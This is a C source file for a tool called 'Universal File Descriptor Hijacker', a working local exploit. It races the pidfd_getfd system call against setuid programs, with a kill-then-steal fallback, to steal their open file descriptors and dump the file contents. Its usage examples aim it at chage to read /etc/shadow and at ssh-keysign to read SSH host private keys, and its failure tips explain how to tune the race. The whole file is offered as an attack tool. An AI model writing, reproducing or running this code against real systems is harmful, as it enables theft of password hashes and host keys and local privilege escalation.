/*
 * Universal File Descriptor Hijacker
 * Combines multiple POCs for arbitrary file reading via pidfd_getfd races
 * 
 * Usage: ./universal_hijack <target_binary> <file_pattern> [options]
 * Options:
 *   --kill-mode     Use kill-then-steal approach (for setuid programs)
 *   --rounds N      Number of fork rounds (default: 500)
 *   --timeout MS    Timeout per attempt in microseconds (default: 200000)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <getopt.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

// Configuration
typedef struct {
    const char *target;
    const char *pattern;
    int kill_mode;
    int rounds;
    int timeout_us;
    int verbose;
} config_t;

// System call wrappers
static int pidfd_open(pid_t pid, unsigned flags) {
    return syscall(__NR_pidfd_open, pid, flags);
}

static int pidfd_getfd(int pfd, int fd, unsigned flags) {
    return syscall(__NR_pidfd_getfd, pfd, fd, flags);
}

// Check if file descriptor points to matching file
static int check_fd_match(int fd, const char *pattern) {
    char path[256] = {0};
    char linkpath[64];
    
    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);
    ssize_t n = readlink(linkpath, path, sizeof(path) - 1);
    if (n <= 0) return 0;
    
    path[n] = '\0';
    return (strstr(path, pattern) != NULL);
}

// Read and output file content from stolen fd
static void dump_fd_content(int fd, const char *label) {
    char buf[8192];
    ssize_t n;
    
    lseek(fd, 0, SEEK_SET);
    fprintf(stderr, "[+] Dumping %s:\n", label);
    fprintf(stderr, "========================================\n");
    
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        fwrite(buf, 1, n, stdout);
    }
    
    fprintf(stderr, "\n========================================\n");
}

// Strategy 1: Direct race (like chage/ssh-keysign)
static int direct_race(const config_t *cfg) {
    fprintf(stderr, "[*] Starting direct race against %s\n", cfg->target);
    
    for (int round = 0; round < cfg->rounds; round++) {
        pid_t child = fork();
        
        if (child == 0) {
            // Child: execute target
            int devnull = open("/dev/null", O_RDWR);
            if (devnull >= 0) {
                dup2(devnull, 0);
                dup2(devnull, 1);
                dup2(devnull, 2);
                close(devnull);
            }
            execl(cfg->target, cfg->target, (char *)NULL);
            _exit(127);
        }
        
        // Parent: try to steal fd
        int pfd = pidfd_open(child, 0);
        if (pfd < 0) {
            waitpid(child, NULL, 0);
            continue;
        }
        
        int stolen_fd = -1;
        char matched_path[256] = {0};
        
        for (int attempt = 0; attempt < 30000 && stolen_fd < 0; attempt++) {
            for (int fd = 3; fd < 32; fd++) {
                int s = pidfd_getfd(pfd, fd, 0);
                if (s < 0) continue;
                
                if (check_fd_match(s, cfg->pattern)) {
                    // Found matching fd
                    char linkpath[64];
                    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", s);
                    readlink(linkpath, matched_path, sizeof(matched_path) - 1);
                    stolen_fd = s;
                    break;
                }
                close(s);
            }
        }
        
        if (stolen_fd >= 0) {
            fprintf(stderr, "[!] Stole fd %d -> %s (round=%d)\n", 
                    stolen_fd, matched_path, round);
            dump_fd_content(stolen_fd, matched_path);
            close(stolen_fd);
            close(pfd);
            waitpid(child, NULL, 0);
            return 0;
        }
        
        close(pfd);
        waitpid(child, NULL, 0);
    }
    
    return 1;
}

// Strategy 2: Kill-then-steal (for setuid programs)
static int kill_then_steal(const config_t *cfg) {
    fprintf(stderr, "[*] Using kill-then-steal strategy\n");
    
    pid_t child = fork();
    if (child == 0) {
        execl(cfg->target, cfg->target, (char *)NULL);
        _exit(127);
    }
    
    usleep(cfg->timeout_us);
    
    int pfd = pidfd_open(child, 0);
    if (pfd < 0) {
        perror("pidfd_open");
        kill(child, SIGKILL);
        return 1;
    }
    
    // First pass: check for EPERM (indicates live process)
    int alive_detected = 0;
    for (int fd = 3; fd < 10; fd++) {
        int s = pidfd_getfd(pfd, fd, 0);
        if (s >= 0) {
            close(s);
            continue;
        }
        if (errno == EPERM) {
            fprintf(stderr, "[+] Live process detected (EPERM on fd %d)\n", fd);
            alive_detected = 1;
            break;
        }
    }
    
    // Kill the process
    kill(child, SIGKILL);
    
    // Second pass: steal after death
    int stolen_fd = -1;
    char matched_path[256] = {0};
    
    for (int attempt = 0; attempt < 20000 && stolen_fd < 0; attempt++) {
        for (int fd = 3; fd < 16; fd++) {
            int s = pidfd_getfd(pfd, fd, 0);
            if (s < 0) continue;
            
            if (check_fd_match(s, cfg->pattern)) {
                char linkpath[64];
                snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", s);
                readlink(linkpath, matched_path, sizeof(matched_path) - 1);
                stolen_fd = s;
                break;
            }
            close(s);
        }
    }
    
    if (stolen_fd >= 0) {
        fprintf(stderr, "[!] Stole fd %d -> %s\n", stolen_fd, matched_path);
        dump_fd_content(stolen_fd, matched_path);
        close(stolen_fd);
    }
    
    close(pfd);
    waitpid(child, NULL, 0);
    return (stolen_fd >= 0) ? 0 : 1;
}

// Auto-detect best strategy
static int auto_strategy(const config_t *cfg) {
    fprintf(stderr, "[*] Auto-detecting strategy for %s\n", cfg->target);
    
    // Try direct race first (faster)
    if (direct_race(cfg) == 0) {
        return 0;
    }
    
    // Fall back to kill-then-steal
    fprintf(stderr, "[*] Direct race failed, trying kill mode...\n");
    config_t cfg_kill = *cfg;
    cfg_kill.kill_mode = 1;
    return kill_then_steal(&cfg_kill);
}

void print_usage(const char *prog) {
    fprintf(stderr, "Universal File Descriptor Hijacker\n\n");
    fprintf(stderr, "Usage: %s <target_binary> <file_pattern> [options]\n\n", prog);
    fprintf(stderr, "Arguments:\n");
    fprintf(stderr, "  target_binary    Path to vulnerable setuid program\n");
    fprintf(stderr, "  file_pattern     String to match in opened file paths\n\n");
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --kill-mode      Force kill-then-steal strategy\n");
    fprintf(stderr, "  --rounds N       Number of fork rounds (default: 500)\n");
    fprintf(stderr, "  --timeout US     Timeout in microseconds (default: 200000)\n");
    fprintf(stderr, "  --verbose        Verbose output\n");
    fprintf(stderr, "  --help           Show this help\n\n");
    fprintf(stderr, "Examples:\n");
    fprintf(stderr, "  %s /usr/bin/chage \"/etc/shadow\"\n", prog);
    fprintf(stderr, "  %s /usr/libexec/ssh-keysign \"ssh_host_.*_key\"\n", prog);
    fprintf(stderr, "  %s ./vuln_target \"/etc/shadow\" --kill-mode\n", prog);
}

int main(int argc, char **argv) {
    config_t cfg = {
        .target = NULL,
        .pattern = NULL,
        .kill_mode = 0,
        .rounds = 500,
        .timeout_us = 200000,
        .verbose = 0
    };
    
    static struct option long_options[] = {
        {"kill-mode", no_argument, &cfg.kill_mode, 1},
        {"rounds", required_argument, 0, 'r'},
        {"timeout", required_argument, 0, 't'},
        {"verbose", no_argument, &cfg.verbose, 1},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    while ((opt = getopt_long(argc, argv, "r:t:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'r':
                cfg.rounds = atoi(optarg);
                break;
            case 't':
                cfg.timeout_us = atoi(optarg);
                break;
            case 'v':
                cfg.verbose = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            case 0:
                break;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    if (optind + 2 > argc) {
        print_usage(argv[0]);
        return 1;
    }
    
    cfg.target = argv[optind];
    cfg.pattern = argv[optind + 1];
    
    // Verify target exists and is executable
    if (access(cfg.target, X_OK) != 0) {
        fprintf(stderr, "[-] Target %s not found or not executable\n", cfg.target);
        return 1;
    }
    
    fprintf(stderr, "[*] Target: %s\n", cfg.target);
    fprintf(stderr, "[*] Pattern: %s\n", cfg.pattern);
    fprintf(stderr, "[*] Rounds: %d\n", cfg.rounds);
    fprintf(stderr, "[*] Mode: %s\n", cfg.kill_mode ? "kill-then-steal" : "auto");
    
    // Execute appropriate strategy
    int result;
    if (cfg.kill_mode) {
        result = kill_then_steal(&cfg);
    } else {
        result = auto_strategy(&cfg);
    }
    
    if (result != 0) {
        fprintf(stderr, "[-] Failed to hijack file descriptor\n");
        fprintf(stderr, "[*] Tips:\n");
        fprintf(stderr, "    - Try --kill-mode if target is setuid\n");
        fprintf(stderr, "    - Increase --rounds for slower races\n");
        fprintf(stderr, "    - Adjust --timeout based on target behavior\n");
    }
    
    return result;
}
